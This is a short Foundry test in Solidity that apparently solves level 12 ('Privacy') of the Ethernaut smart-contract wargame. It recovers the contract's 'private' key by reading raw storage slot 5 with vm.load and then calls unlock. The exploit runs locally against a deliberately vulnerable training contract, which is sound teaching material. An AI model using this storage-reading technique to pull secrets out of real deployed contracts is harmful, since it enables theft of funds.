// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../../src/ethernaut/level_12/Privacy.sol";

contract PrivacyTest is Test {
    Privacy privacy;

    function setUp() public {
        privacy = new Privacy([bytes32("test"), bytes32("test2"), bytes32("test3")]);
    }

    function testAttack() public {
        bytes32 key = vm.load(address(privacy), bytes32(uint256(5)));
        privacy.unlock(bytes16(key));
        assertFalse(privacy.locked());
    }
}
